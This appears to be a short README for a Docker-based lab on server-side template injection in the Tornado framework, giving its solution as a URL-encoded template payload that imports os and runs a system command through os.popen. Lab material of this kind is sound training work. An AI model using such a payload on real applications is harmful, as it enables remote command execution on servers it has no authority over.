# Template Injection : Tornado

## Build instructions

Requirements:
 - Docker
 - Docker-compose

## Solution

```
{%import%20os%}{{os.popen(%22whoami%22).read()}}
```

